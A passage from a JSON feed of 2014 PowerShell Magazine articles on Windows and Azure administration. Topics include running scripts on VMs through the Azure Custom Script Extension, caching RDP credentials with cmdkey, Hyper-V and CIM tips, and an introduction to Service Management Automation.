the Get-AzureVMAvailableExtension cmdlet to see what extensions are available to us.\nNow that we know what extensions are available in general, we can use the Azure VM extension cmdlets to manage them.\nThe Get-AzureVMExtension cmdlet tells us what extensions are already installed in our Azure VM.\n$Vm = Get-AzureVM -ServiceName \"DSCDemo\" -Name \"DSCPull\" Get-AzureVMExtension -VM $Vm | Select ExtensionName, Publisher, Version  So, I have only the BGInfo Extension installed in my Azure VM. We can use the Set-AzureVMExtension cmdlet to install the Custom Script Extension.\nSet-AzureVMExtension -ExtensionName CustomScriptExtension -VM $vm -Publisher Microsoft.Compute | Update-AzureVM -Verbose  Now that we have the Custom Script Extension enabled, let’s take a look at the Set-AzureVMCustomScriptExtension cmdlet. This cmdlet helps us run a script available in a Azure storage account or at an Internet URI. Both methods have distinct use cases. You can find the binaries and log files related to this extension at C:\\Packages\\Plugins and C:\\WindowsAzure\\Logs\\Plugins. If you think the script execution did not work as you expected, you can look at these locations to find what could have gone wrong. There is also PowerShell way of doing that. We will see that in detail in this article.\nExecuting scripts from your storage account The -ContainerName parameter of the Set-AzureVMCustomScriptExtension cmdlet can be used to specify the Azure storage container where the scripts are stored. By default, the Custom Script Extension tries to find this container in the default Azure storage account. So, if you have multiple storage accounts, you will have to specify the -StorageAccountName parameter with the storage account name too. If this is not your own storage account, you need to specify the -StorageAccountKey parameter.\n$Vm = Get-AzureVM -ServiceName \"DSCDemo\" -Name \"DSCPull\" Set-AzureVMCustomScriptExtension -ContainerName scripts -StorageAccountName psmag -FileName user.ps1 -Run user.ps1 -VM $vm | Update-AzureVM -Verbose  The -FileName parameter can be used to specify all script files that need to be downloaded from the storage container. The -Run parameter specifies the script that we want to execute once the script files are downloaded. In my example above, I am using only one script and that is user.ps1. Since the -FileName parameter has only one script file, there is no need to explicitly specify -Run parameter. In the absence of -Run parameter, the Custom Script Extension will execute the first script in the list of file names provided as an input to the -FileName parameter.\nWhen I run the above command, the user.ps1 gets downloaded to C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1 folder in the Azure VM. Once the script file is downloaded, it gets executed by CustomScriptHandler.exe process using the following PowerShell.exe commandline.\npowershell -ExecutionPolicy Unrestricted -file user.ps1  The contents of my user.ps1 script are simple. I wanted to find out what credentials does the Azure VM Custom Script Extension use when running the PowerShell scripts.\n#Contents of user.ps1 whoami  Since I have already executed the script using the Custom Script Extension, I can look at the output generated by script by looking at the VM properties. We need to refresh the VM object by using the Get-AzureVM cmdlet.\n$vm = Get-AzureVM -ServiceName DSCDemo -Name DSCPull $Vm.ResourceExtensionStatusList.ExtensionSettingStatus  The ExtensionSettingStatus property under ResourceExtensionStatusList property of the Azure VM object contains the result of our script execution.\nThe Code property specifies the status code from the CustomScriptHandler.exe execution. The SubStatusList property contains the Standard Output (StdOut) and Standard Error (StdErr) streams from the script execution. So, in our script output, we should be able to see the output of ‘whoami‘ command.\n$Vm.ResourceExtensionStatusList.ExtensionSettingStatus.SubStatusList | Select Name, @{\"Label\"=\"Message\";Expression = {$_.FormattedMessage.Message }}  As we see here, the CustomScriptHandler.exe process runs as the System account. This means using the Azure VM Custom Script Extension we can run any sort of code even if it requires highest system privileges. This might sound scary but given the fact that using this extension requires access to your publish settings or Azure account, this can be assumed safe.\nOutput from a script execution As you see in the above example, there are only two output streams available from the script execution – the standard output and the standard error. So, what happens if your script execution returns a PowerShell object or some type of an object other than string/text output? Let us see an example.\n#Contents of process.ps1 Get-Process  To understand the script output behavior, I created another script called process.ps1 and copied it to the same Azure container as the above example. As you see, the script has just one command that is Get-Process which returns a collection of process objects. I will use the method we saw above to execute the script and collect the output.\nAs we see, the output from the Get-Process cmdlet gets converted to text.\nUsing the FileUri parameter When using the -FileUri parameter, you need to specify the complete URI to the script file you want to execute inside the Azure VM. The user.ps1 and process.ps1 are available in a public Azure container and therefore if we know the storage account and container names, we can build the URI to access the script file. In my example, the storage account name is psmag and the container name is scripts. So, the URI for the user.ps1 script will be_ http://psmag.blob.core.windows.net/scripts/user.ps1_.\nSet-AzureVMCustomScriptExtension -FileUri http://psmag.blob.core.windows.net/scripts/user.ps1 -VM $vm -Verbose | Update-AzureVM -Verbose  Using the -FileUri parameter, the process of executing the script inside the Azure VM isn’t different. The CustomScriptHandler.exe process still downloads the file and then uses PowerShell.exe to execute that.\nPassing arguments to scripts You may want to pass arguments to the scripts that you plan to execute in the Azure VM using the Custom Script Extension. This is where the -Argument parameter comes handy. An example will explain this better.\nSet-AzureVMCustomScriptExtension -FileUri http://psmag.blob.core.windows.net/scripts/hello.ps1 -Run hello.ps1 -Argument \"-fname Windows -lname PowerShell\" -VM $Vm | Update-AzureVM -Verbose  One caveat with the -Argument parameter is that it takes only string values as arguments. So, for the above example, if I want to specify the arguments without the named parameters, we need to specify the arguments for those named parameters as a single string.\nSet-AzureVMCustomScriptExtension -FileUri http://psmag.blob.core.windows.net/scripts/hello.ps1 -Run hello.ps1 -Argument \"Windows PowerShell\" -VM $Vm | Update-AzureVM -Verbose  This results is the same output as the other example using named parameters.\nUpdating scripts downloaded to the Azure VM Like I’d mentioned earlier, the scripts that we execute using the Custom Script Extension get downloaded to C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1 folder in the Azure VM. These script files do not get deleted after the script execution. And, the scripts get downloaded every time we run the Set-AzureVMCustomScriptExtension cmdlet. IMHO, this is not a very good design.\nHowever, here is a caveat. If you use -FileUri to specify the path to a script file and you repeat the same command for the second time, you can see in the log files that the script file does not get downloaded again. This is true even if the script is updated. Here is the excerpt from the log file.\n2014-04-29T17:59:33.9920457Z [Info]: Starting IaaS ScriptHandler Extension v1 2014-04-29T17:59:33.9920457Z [Info]: HandlerEnvironment = Version: 1, HandlerEnvironment: [LogFolder: \"C:\\WindowsAzure\\Logs\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\", ConfigFolder: \"C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\\RuntimeSettings\", StatusFolder: \"C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\\Status\", HeartbeatFile: \"C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\\Status\\HeartBeat.Json\"] 2014-04-29T17:59:33.9920457Z [Info]: Enabling Handler 2014-04-29T17:59:33.9920457Z [Info]: Handler successfully enabled 2014-04-29T17:59:34.0076663Z [Info]: Loading configuration for sequence number 24 2014-04-29T17:59:34.0545913Z [Info]: HandlerSettings = ProtectedSettingsCertThumbprint: , ProtectedSettings: {}, PublicSettings: {FileUris: [https://psmag.blob.core.windows.net/scripts/process.ps1], CommandToExecute: powershell -ExecutionPolicy Unrestricted -file process.ps1 } 2014-04-29T17:59:34.0545913Z [Info]: Downloading files specified in configuration... 2014-04-29T17:59:34.1014232Z [Info]: DownloadFiles: fileUri = \"https://psmag.blob.core.windows.net/scripts/process.ps1\", baseUri = \"https://psmag.blob.core.windows.net/\" 2014-04-29T17:59:35.6763364Z [Info]: Files downloaded. Asynchronously executing command: 'powershell -ExecutionPolicy Unrestricted -file process.ps1 ' 2014-04-29T17:59:35.6953042Z [Info]: Command execution task started. Awaiting completion... 2014-04-29T17:59:36.5209451Z [Info]: Command execution finished. Command exited with code: 0 2014-04-29T18:01:04.4843341Z [Info]: Starting IaaS ScriptHandler Extension v1 2014-04-29T18:01:04.4843341Z [Info]: HandlerEnvironment = Version: 1, HandlerEnvironment: [LogFolder: \"C:\\WindowsAzure\\Logs\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\", ConfigFolder: \"C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\\RuntimeSettings\", StatusFolder: \"C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\\Status\", HeartbeatFile: \"C:\\Packages\\Plugins\\Microsoft.Compute.CustomScriptExtension\\1.0.1\\Status\\HeartBeat.Json\"] 2014-04-29T18:01:04.4843341Z [Info]: Enabling Handler 2014-04-29T18:01:04.4843341Z [Info]: Handler successfully enabled 2014-04-29T18:01:04.4982194Z [Info]: Loading configuration for sequence number 24 2014-04-29T18:01:04.5294705Z [Info]: HandlerSettings = ProtectedSettingsCertThumbprint: , ProtectedSettings: {}, PublicSettings: {FileUris: [https://psmag.blob.core.windows.net/scripts/process.ps1], CommandToExecute: powershell -ExecutionPolicy Unrestricted -file process.ps1 } 2014-04-29T18:01:04.5450936Z [Warn]: Current sequence number, 24, is not greater than the sequence number of the most recently executed configuration. Exiting...  As you see towards the end of the above log, it finds that the sequence number generated for the execution is not greater than the previous run. Looking at the code for CustomScriptHandler.exe, I feel that this is a bug. The only workaround is to execute some other script and then try the Uri method. This downloads the script from storage container again.\nSo, this brings us to the end of our exploration of the new Azure VM Custom Script Extension. There are a couple of other cmdlets that can help manage this extension.\nThe Get-AzureVMCustomScriptExtension cmdlet gives you the details about the last script that was executed and the Remove-AzureVMCustomScriptExtension cmdlet removes the Custom Script Extension from the Azure VM.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/30/understanding-azure-custom-script-extension/","tags":["Azure"],"title":"Understanding Azure Custom Script Extension"},{"categories":["News"],"contents":"We are pleased to announce the availability of Windows PowerShell 4.0 quick reference guides created by PowerShell Magazine. They are now part of “Windows PowerShell 4.0 and Other Quick Reference Guides” package that you can download on the Microsoft Download Center.\nThe PDF files in this download are quick reference (also called “cheat sheet”) guides for IT professionals and scripting enthusiasts who want to learn tips, shortcuts, common operations, limitations, and proper syntax for using Windows Powershell 4.0, Windows PowerShell Desired State Configuration, Windows PowerShell ISE, Windows PowerShell Web Access, Server Manager for Windows Server 2012 R2, WinRM, WMI, and WS-Man.\nThe download package contains the following files:\n PowerShell_LangRef_v4.pdf – This four-page reference describes operators, arrays, useful commands, methods, and other tips for using Windows PowerShell 4.0. Also included is a Windows PowerShell reading and tutorial resource list. PowerShell_ISE_v4.pdf – This two-page reference describes keyboard shortcuts and hotkeys that you can use to navigate Windows PowerShell Integrated Scripting Environment (ISE) more quickly, and describes the updated ISE object model. Also included are tips for configuring $ps.ISE options, profiles, and properties. PowerShell_Examples_v4.pdf – This two-page reference describes how to perform popular IT management and scripting tasks by using Windows PowerShell 4.0, including how to fetch data by using Management OData IIS Services, how to schedule jobs, how to add a #Requires statement to a script, and how to save Help for a module that is not necessarily installed on the local computer. PowerShell_DSC_v4.pdf – Windows PowerShell Desired State Configuration (DSC) is new for Windows PowerShell 4.0. This two-page reference provides an overview of how DSC works, and describes the DSC cmdlets, available resources, Local Configuration Manager, and advanced resource properties. Quick_Reference_SM_WS12.pdf – This two-page reference describes common tasks that you can perform in the Server Manager console in Windows Server 2012 R2. Quickly learn how to manage remote servers that are running older versions of Windows Server by using Server Manager; how to run Server Manager deployment cmdlets for Windows PowerShell; how to save and export Server Manager settings, such as the servers you have added to the server pool, and custom server groups that you have created; where to find Server Manager log files; how to run popular WinRM commands such as creating a new listener; how to install roles and features on offline VHDs; and where to find documentation to help you manage multiple, remote servers by using Server Manager and Windows PowerShell. Quick_Reference_WMI_ITPro_WS12R2.pdf – This two-page reference describes features that were introduced to Windows Management Instrumentation (WMI) starting in Windows PowerShell 3.0. Included are examples of how to find namespaces and classes in WMI, and detailed information about CimSession, CimInstance, CIM operations, and invoking a CIM method. The quick reference describes how to get a list of new CIM cmdlets, and defines associations, WQL, WS-Man, WinRM, and CIM indications. Quick_Reference_WMI_Devs_WS12R2.pdf – This two-page reference describes features that were introduced to Windows Management Instrumentation (WMI) starting in Windows PowerShell 3.0 for developers. Included are examples of APIs and tools in WMI, and information about Convert-MofToProvider.  For a future reference, there is a link to these guides in the Downloads section.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/24/windows-powershell-4-0-and-other-quick-reference-guides/","tags":["News"],"title":"Windows PowerShell 4.0 and Other Quick Reference Guides"},{"categories":["Azure Automation","Azure","News"],"contents":"Microsoft launched a new service to simplify public, private, and hybrid clouds management. Using the Microsoft Azure Automation preview you can automate the creation, deployment, monitoring, and maintenance of resources in your Microsoft Azure environment using runbooks, which under the hood are Windows PowerShell workflows. Those in turn, provide a highly reliable service that can create checkpoints and resume your workflows when errors, crashes, and network issues occur. The service can integrate and connect into any system that exposes an API over typical Internet protocols. Out of box, Azure Automation ships with integration into many Azure services, including:\n Web Sites (management) Cloud Services (management) Virtual Machines (management and WinRM support) Storage (management) SQL Server (management and SQL support)  For more information:\n Get started with Azure Automation Automation Library Authoring Runbooks Backing up Azure Automation  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/24/microsoft-azure-automation/","tags":["Azure","News","Azure Automation"],"title":"Microsoft Azure Automation"},{"categories":["WMI","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nAt PowerShell training I did earlier this week, an attendee asked me if there is a way to map a CIM class property’s ValueMap to the Values.\nThe ValueMap and Values are the CIM property qualifiers. So, when looking at the CIM classes that implement such properties, we need to map the value of the property to a string in the Values qualifier for the property. For example, the Win32_PrinterConfiguration class has a property called Color which defines if the printer is a Monochrome (1) or a Color (2) printer. However, the Color property has the ValueMap and Values qualifiers that define this mapping. When we get an instance of this class using the Get-CimInstance cmdlet, we only see the numbers and not the mapping to string descriptions.\nPS\u0026gt; Get-CimInstance -ClassName Win32_PrinterConfiguration | Select Name, Color Name Color ---- ----- Snagit 9 2 Send To OneNote 2010 2 Microsoft XPS Document Writer 2 Fax 1 DESK 1 Adobe PDF 2 HOME 1 Now, if you want to map this to a string value for easy interpretation, you need to create a mapping between the ValueMap and Values qualifiers. I have written a generic function to get the mapping:\nFunction Get-CimPropertyValueHash { [CmdletBinding()] Param ( [Parameter()] [String]$Namespace='root\\cimv2', [Parameter(Mandatory=$true)] [String]$ClassName, [Parameter(Mandatory=$true)] [String]$PropertyName ) $CimProperties = Get-CimClass -Namespace $Namespace -ClassName $ClassName | Select -ExpandProperty CimClassProperties -ErrorAction SilentlyContinue if ($CimProperties) { $CimValueMapProperty = $CimProperties | Where-Object { ($_.Name -eq $PropertyName) -and (($_.Qualifiers -match 'ValueMap') -and ($_.Qualifiers -match 'Values') )} if ($CimValueMapProperty) { $ValueMapHash = [Ordered]@{} $Values = $CimValueMapProperty.Qualifiers[\u0026quot;Values\u0026quot;].Value $ValueMap = $CimValueMapProperty.Qualifiers[\u0026quot;ValueMap\u0026quot;].Value for($i = 0; $i -lt $Values.Length; $i++) { $ValueMapHash.Add($ValueMap[$i], $Values[$i]) } $ValueMapHash } else { throw \u0026quot;There is an error retrieving the property details. Either the property does not have the ValueMap and Values qualifiers or the PropertyName is invalid\u0026quot; } } else { throw \u0026quot;There is an error retrieving the class details. Please check the Namespace and ClassName values\u0026quot; } }  It’s very easy to use this function:\nPS\u0026gt; Get-CimPropertyValueHash -ClassName Win32_PrinterConfiguration -PropertyName Color Name Value ---- ----- 1 Monochrome 2 Color Once we have the mapping between the ValueMap and Values, we can use the resulting hash to get the string representation of the Color property.\nPS\u0026gt; Get-CimInstance -ClassName Win32_PrinterConfiguration | Select Name,@{\u0026quot;Label\u0026quot;=\u0026quot;ColorType\u0026quot;;Expression={$colorHash[[string]$_.Color]}} Name ColorType ---- --------- Snagit 9 Color Send To OneNote 2010 Color Microsoft XPS Document Writer Color Fax Monochrome DESK Monochrome Adobe PDF Color HOME Monochrome Now, if you are wondering how to get the CIM class properties with the ValueMap and Values qualifiers, you can use the following code snippet:\nGet-CimClass -PipelineVariable Class | Select -ExpandProperty CimClassProperties | Where-Object { $_.Qualifiers -match \"ValueMap\" -and $_.Qualifiers -match \"Values\" } | Select @{\"Label\"=\"ClassName\";Expression={$Class.CimClassName}}, Name  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/23/pstip-mapping-the-cim-valuemap-and-value-qualifiers/","tags":["WMI","Tips and Tricks"],"title":"#PSTip Mapping the CIM ValueMap and Values qualifiers"},{"categories":["How To"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nAs a PowerShell user, you probably have a PowerShell console or the ISE editor on standby. Wouldn’t it be nice to be able to just hack in a “Connect-RDP” and immediately be connected to a remote desktop when you need it? And let PowerShell deal with login credentials? Here’s how.\nSecurely Caching Credentials To securely cache login credentials, you can use the command line utility cmdkey.exe. With this utility, you can save a username and a password for a given remote connection. Windows will then securely cache the information and automatically use it when needed.\nConnect-RDP – Auto-Login for RDP Sessions Here is a function called Connect-RDP that automates the RDP connection:\nfunction Connect-RDP { param ( [Parameter(Mandatory=$true)] $ComputerName, [System.Management.Automation.Credential()] $Credential ) # take each computername and process it individually $ComputerName | ForEach-Object { # if the user has submitted a credential, store it # safely using cmdkey.exe for the given connection if ($PSBoundParameters.ContainsKey('Credential')) { # extract username and password from credential $User = $Credential.UserName $Password = $Credential.GetNetworkCredential().Password # save information using cmdkey.exe cmdkey.exe /generic:$_ /user:$User /pass:$Password } # initiate the RDP connection # connection will automatically use cached credentials # if there are no cached credentials, you will have to log on # manually, so on first use, make sure you use -Credential to submit # logon credential mstsc.exe /v $_ /f } } Set or Update Cached Credentials To cache credentials for a new remote desktop connection, this is how you’d call the function:\nPS\u0026gt; Connect-RDP 10.20.30.40 -Credential testdomain\\Administrator You would then be prompted for the connection password, and the RDP connection gets initiated. Internally, Connect-RDP stores the logon information in your credential cache. So from now on, to connect to the server via RDP, you no longer need the credentials. Next time, this is all you need:\nConnect-RDP 10.20.30.40 Using Multiple Connections The function also supports multiple connections. If all of the connections require the same logon information, you can set it in one step:\nPS\u0026gt; Connect-RDP 10.20.30.40, 10.20.30.41, 10.20.30.42 -Credential testdomain\\Administrator  If the connections require different logon credentials, then set the credentials individually:\nPS\u0026gt; Connect-RDP 10.20.30.40 -Credential testdomain\\Administrator PS\u0026gt; Connect-RDP 10.20.30.41 -Credential testdomain\\Testaccount12 PS\u0026gt; Connect-RDP 10.20.30.42 -Credential testdomain\\Tobias Once you have set cached credentials for all your RDP servers, you can connect to one or many with just one call:\nPS\u0026gt; Connect-RDP 10.20.30.40, 10.20.30.41, 10.20.30.42 PowerShell will use the appropriate cached credentials for each of these connections, and opens an RDP session for each server.\nManage Cached Credentials To manage your cached credentials, use cmdkey.exe:\nPS\u0026gt; cmdkey Creates, displays, and deletes stored user names and passwords. The syntax of this command is: CMDKEY [{/add | /generic}:targetname {/smartcard | /user:username {/pass{:password}}} | /delete{:targetname | /ras} | /list{:targetname}] Examples: To list available credentials: cmdkey /list cmdkey /list:targetname To create domain credentials: cmdkey /add:targetname /user:username /pass:password cmdkey /add:targetname /user:username /pass cmdkey /add:targetname /user:username cmdkey /add:targetname /smartcard To create generic credentials: The /add switch may be replaced by /generic to create generic credentials To delete existing credentials: cmdkey /delete:targetname To delete RAS credentials: cmdkey /delete /ras PS\u0026gt; cmdkey /list:10.16.114.11 Currently stored credentials for 10.16.114.11: Target: 10.16.114.11 Type: Generic User: citrixdev\\Administrator ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/18/automatic-remote-desktop-connection/","tags":["How To"],"title":"Automatic Remote Desktop Connection"},{"categories":["News"],"contents":"Microsoft has released a new ISE add-on, developed by Microsoft Customer Services \u0026amp; Support (CSS) team, that enables you to easilysearch and download scripts from the TechNet Script Center, from within the scripting environment.\nThe Script Browser add-on is bundled with a new experimental function: Script Analyzer. Script Analyzer uses the PowerShell Abstract Syntax Tree (AST) to check your current script against some predefined rules.\nFor more information, refer to the official announcement on the PowerShell Team blog.\nNote: There’s a known issue on some non-en-US systems. See this page for a workaround. Microsoft’s confirmed the issue and an update should be released soon.\nIf you encounter any problems or have any suggestions, you can report them to onescript@microsoft.com.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/18/script-browser-for-windows-powershell-ise/","tags":["News"],"title":"Script Browser for Windows PowerShell ISE"},{"categories":["Hyper-V","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWhile reviewing results returned by the Best Practices Analyzer on a virtual machine, a warning about RSS (Receive Side Scaling) was raised.\nRSS has been around since Windows 2008. The online help states:\n“RSS is a scalability technology that distributes the receive network traffic among multiple processors by hashing the header of the incoming packet. Without RSS in Windows Server® 2008 and later, network traffic is received on the first processor which can quickly reach full utilization limiting receive network throughput.”\nIt’s a nice surprise–RSS has now been extended to Windows Server 2012 R2 Hyper-V. The guest virtual machine can now use this functionality. To check whether my virtual network adapter was really RSS capable, I used the Get-SmbClientNetworkInterface cmdlet:\nGet-SmbClientNetworkInterface | Format-Table -Property FriendlyName,RssCapable -AutoSize  To determine how the virtual network adapter was currently configured:\nGet-NetAdapter | Where Status -eq \"Up\" | Get-NetAdapterAdvancedProperty -DisplayName \"Receive Side Scaling\" | Format-Table -AutoSize  To turn on RSS on the RSS-capable virtual network adapter:\nGet-NetAdapter | Where Status -eq \"Up\" | Get-NetAdapterAdvancedProperty -DisplayName \"Receive Side Scaling\" | Where DisplayValue -eq \"Disabled\" | Enable-NetAdapterRss -Verbose  Note that you can add –NoRestart switch to the Enable-NetAdapterRss cmdlet to avoid the network adapter from being restarted immediately.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/17/pstip-enabling-rss-inside-hyper-v-guest-os/","tags":["Hyper-V","Tips and Tricks"],"title":"#PStip Enabling RSS inside Hyper-V guest OS"},{"categories":["Hyper-V","Tips and Tricks","WMI"],"contents":"Hyper-V in Windows 8.1 and Windows Server 2012 R2 introduced Generation 2 virtual machines, which provides new feature and better performance. One of the new features is UEFI, a replacement of the traditional BIOS. When troubleshooting boot problems on Generation 2 virtual machines, for example as part of a new image build, one of the issues is that the boot process is so fast it is hard to follow what is happening.\nFor advanced users, there is a CIM property in the Msvm_VirtualSystemSettingData class called PauseAfterBootFailure:\nGet-CimClass -Namespace 'Root\\Virtualization\\V2' -ClassName Msvm_VirtualSystemSettingData | Select-Object -ExpandProperty CimClassProperties | where name -eq \u0026quot;PauseAfterBootFailure\u0026quot; Name : PauseAfterBootFailure Value : CimType : Boolean Flags : Property, NullValue Qualifiers : {read, write} ReferenceClassName : This property is by default set to $false. During troubleshooting it might be useful to enable this setting. Normally we would expect to accomplish this is by leveraging the CIM cmdlets:\nGet-CimInstance -Namespace Root\\Virtualization\\V2 -ClassName Msvm_VirtualSystemSettingData -Filter \"ElementName = 'Demo-VM'\" | Set-CimInstance -Property @{PauseAfterBootFailure=$true} –PassThru  Alternatively, by using Get-WmiObject:\n$vm = Get-WmiObject -Class Msvm_VirtualSystemSettingData -Namespace Root\\Virtualization\\V2 -Filter \"ElementName = 'Demo-VM'\" $vm.PauseAfterBootFailure = $true $vm.Put()  Although these commands does not produce any error messages, the property remains unchanged.\nThe reason for this is that the original WMI APIs did not provide a way to pass a WMI instance as the argument to a method directly; to pass an object to a method, you would serialize it into an embedded instance, a string representation of the object in XML form (using the ManagementObject.GetText method).\nThe Hyper-V WMI provider continues to expect any input objects in embedded-instance format, but the CimInstance objects retrieved by the CIM cmdlets do not currently provide a convenience method for serializing an object into an embedded instance.\n#Virtual System Management Service $VSMS = Get-CimInstance -Namespace root/virtualization/v2 -Class Msvm_VirtualSystemManagementService #Virtual Machine $VM = Get-CimInstance -Namespace root/virtualization/v2 -Class Msvm_ComputerSystem -Filter \u0026quot;ElementName='Demo-VM'\u0026quot; #Setting Data $SD = $vm | Get-CimAssociatedInstance -ResultClassName Msvm_VirtualSystemSettingData -Association Msvm_SettingsDefineState #Update boot option $SD.PauseAfterBootFailure = $True #Create embedded instance $cimSerializer = [Microsoft.Management.Infrastructure.Serialization.CimSerializer]::Create() $serializedInstance = $cimSerializer.Serialize($SD, [Microsoft.Management.Infrastructure.Serialization.InstanceSerializationOptions]::None) $embeddedInstanceString = [System.Text.Encoding]::Unicode.GetString($serializedInstance) #Modify the system settings Invoke-CimMethod -CimInstance $VSMS -MethodName ModifySystemSettings @{SystemSettings = $embeddedInstanceString} When the PauseAfterBootFailure property is set to $true, the specified virtual machine will ask the user to press a key when a boot attempt failed:\nThe same technique can be used to modify other writable properties in the Msvm_VirtualSystemSettingData class.\nThanks to Brian Young at Microsoft for his assistance explaining this behavior.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/16/pstip-pause-after-uefi-boot-failure-when-using-hyper-v-generation-2-virtual-machines/","tags":["Hyper-V","Tips and Tricks","WMI"],"title":"#PSTip Pause after UEFI boot failure when using Hyper-V Generation 2 virtual machines"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nYesterday, I got a call from one of our BI managers. Listen, he says, I suspect that one of my BI servers is working too hard. It’s a physical server with 64GB of RAM and I think it doesn’t utilize all of its memory.\nWe were able to determine that the installed OS was actually a wrong one. We had Server 2008 R2 installed, and according to this article, Standard editions (of 2008 R2) are limited to 32GB. I took a quick look the values in Task Manager and I could verify that the total memory was 32GB.\nA second look at the system properties page confirmed the above.\nWith that, I continued to the next step of upgrading the servers to Enterprise edition. Luckily I did not have to re-install the server. I followed this article and used DISM for the upgrade. Using the following script I found 3 more servers in my environment that had more physical memory than the OS could see.\n$computers = Get-ADComputer -Filter {OperatingSystem -like \u0026quot;*standard*\u0026quot;} -Properties OperatingSystem | Select-Object Name,OperatingSystem foreach($computer in $computers) { if(Test-Connection -ComputerName $computer.Name -Count 1 -Quiet) { $total = (Get-WmiObject Win32_PhysicalMemory -ComputerName $computer.Name | Measure-Object Capacity -Sum).Sum/1GB $visible = (Get-WmiObject Win32_OperatingSystem -ComputerName $computer.Name).TotalVisibleMemorySize/1MB if( ($total-$visible) -gt 2) { New-Object PSObject -Property @{ Name = $computer.Name OS = $computer.OperatingSystem Memory = $total Visible = $visible } } } }  The code get’s all standard servers from AD and checks if the total amount of RAM is larger, by 2GB, from the amount of visible ram. The result of TotalVisibleMemorySize does not give absolute numbers. You might get 31.7 when you have 32GB of RAM. So a difference of 2GB will filter out all those “almost” values.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/04/15/pstip-how-to-identify-memory-limited-servers-using-powershell/","tags":["Tips and Tricks"],"title":"#PSTip How to identify “memory limited” servers using PowerShell"},{"categories":["Service Management Automation"],"contents":"Service Management Automation (SMA) is a new component in System Center for process automation.\nBefore looking into the technical details, let’s have a look at what practical use cases there are for an automation product like SMA:\n Automate maintenance tasks such as orchestrating patching of Windows Failover clusters, stop and start services as well as starting and stopping virtual machines in a defined order when doing maintenance work Automate business processes such as creating, changing and removing user accounts, password resets and automating file transfers Automating tasks in a service catalog and change management such as creating virtual machines and automatic configuration of backups Dynamic resource allocation based on load or calendar. A practical example might be extending a web farm with additional instances before the Christmas holidays Respond to alarms from operations tools such as System Center Operations Manager Integrations across systems, such as automatically creating an incident in an incident management system based on an event from an operations system  SMA is not a separate component in the System Center suite on the same level as the other components such as Configuration Manager and Virtual Machine Manager; the installation files are included in the installation media for Orchestrator:\nAs we can see based on the above screenshot, SMA has 3 components:\nWeb Service – Web API (RESTful OData) used for several tasks–communication with Windows Azure Pack, distribution of runbook jobs to Runbook Workers, as well as delegating permissions.\nRunbook Worker – Executes runbook jobs. These might be scheduled or triggered manually.\nPowerShell Module – Cmdlets for administering SMA.\nIn addition, a SQL database is needed to store data (needs to be specified during installation). From an architecture level there are similarities between System Center Orchestrator (SCO) and Service Management Automation (SMA). The main difference in the user experience is that SCO has a graphical interface with drag-and-drop support, while SMA is 100% based on Windows PowerShell Workflow.\nPowerShell Workflow, introduced in PowerShell 3.0, is built upon Windows Workflow Foundation. PowerShell Workflow makes it possible to orchestrate long-running activities and automate complex tasks, such as deploying a service containing several servers. PowerShell Workflow is capable of executing activities in parallel, resuming execution after a failure (such as network outage) and surviving a restart of a managed node. Details and links to more information about PowerShell Workflow are available in the article «When Windows PowerShell Met Workflow» on the Windows PowerShell Team blog.\nPortal SMA itself does not have a built-in portal; the only way to define runbooks is by using the PowerShell cmdlets or the web service. Windows Azure Pack for Windows Server is a free component for hosting providers and enterprises which provides a user experience consistent with Windows Azure:\nOne of the components of Windows Azure Pack is Automation, which is based on a connection to the SMA web service. This makes it possible to use the Automation component available in Windows Azure Pack as a web portal for SMA:\nThe first item we see when entering the Automation portal is the Dashboard, which provides an overview of the defined runbooks.\nRunbooks provides a view of all runbooks defined, with options for sorting based on status, tags or search query:\nClicking on a runbook name brings you to a dedicated dashboard for the selected runbook, where statistics for the runbook jobs are available:\nJobs provides history and output for each job instance, which has been executed for the runbook:\nAuthor shows the published version of the runbook:\nDraft provides the ability to edit and test the code defined in the runbook:\nWhen you authoring a runbook, the runbook has to start with the keyword workflow followed by the name of the runbook. Optionally a param block can be provided in order to define parameters for the runbook. The actual code is defined after the param block.\nIf parameters are defined, values for these may be provided when starting the runbook:\nThese values can also be provided if the runbook is scheduled.\nSchedules may be defined in the next menu item:\nThe last menu item for a runbook is Configure, giving options such as providing a description, tags and enabling debugging and logging:\nDebugging and logging will write a lot of data in the database, and should only be enabled during troubleshooting.\nThe last item we will have a look at in the Automation portal in Windows Azure Pack is Assets:\nAn asset (also called a global resource) may be a PowerShell module or one of the following:\nConnections are connections to other systems, such as other System Center components like Data Protection Manager and Virtual Machine Manager. Credentials, variables, and certificates can be defined in order to avoid hardcoding them in runbooks. The last type of asset is a schedule, which we have already looked at. All assets are globally available and shared among all runbooks.\nArchitecture When PowerShell Workflow is used outside of SMA, state («persistence») is stored on a file system on the machine executing the workflow. With SMA we get a highly available workflow, because persistence is stored in a SQL database.\nThis makes it possible to build a highly available automation platform, by configuring a highly available SQL service (using clustering or AlwaysOn) as well as 2 or more servers with the SMA 